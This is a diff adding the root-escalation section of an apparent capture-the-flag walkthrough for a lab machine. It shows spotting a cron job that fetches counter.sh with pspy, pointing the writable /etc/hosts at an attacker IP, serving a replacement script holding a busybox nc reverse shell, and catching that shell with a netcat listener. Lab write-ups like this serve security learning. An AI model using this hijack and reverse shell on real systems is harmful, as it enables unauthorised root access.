@@ -114,6 +114,56 @@ Decode the base64 code into plain text.
 We can now finally retrieve the user flag.
 Escalating to root is going to be complicated. But hang on.
 
-The vulnerability leads us to cronjob. 
+Other walkthroughs used a snooping tool called **Pspy**. It tracks processes without root permissions.
+
+The vulnerability leads us to cronjob. One of the processes runs a shell code from **mkingdom.thm:85** called **counter.sh**.
+
+From Pspy:
+```
+curl mkingdom.thm:85/app/castle/application/counter.sh
+```
+
+Checking the given hosts, the file is writable!
+```
+$ls -la /etc/hosts
+-rw-rw-r-- 1 root mario 342 Jan 26 19:53 /etc/hosts
+```
+
+Let's modify the ip into our attacker ip:
+```
+127.0.0.1        localhost
+[ATTACKER-IP]    mkingdom.thm
+...
+```
+
+### ATTACKER MACHINE
+In our `attacker machine` let's replicate the folder path of the counter.sh:
+```
+$ mkdir -p app/castle/application/
+```
+Then add a shell same as counter.sh:
+```
+$ cat app/castle/application/counter.sh
+#!/bin/bash
+busybox nc [ATTACKER-IP] 8888 -e sh
+```
+
+From another attacker terminal run a server in 85:
+```
+$ python -m http.server 85
+Serving HTTP on 0.0.0.0 port 85 (http://0.0.0.0:85/)  ...
+``` 
+
+And also run a listener to capture the reverse once the **container.sh** runs.\
+```
+$ nc -lvnp 8888
+listening on [any] 8888  ...
+connect to [ATTACKER-IP]  
+```
+
+After a few seconds, there will be request appearing in the python server.
+Soon the reverse shell will appear in the listener.
+
+Finally the root access. Retrieve now the root.txt!
 
 
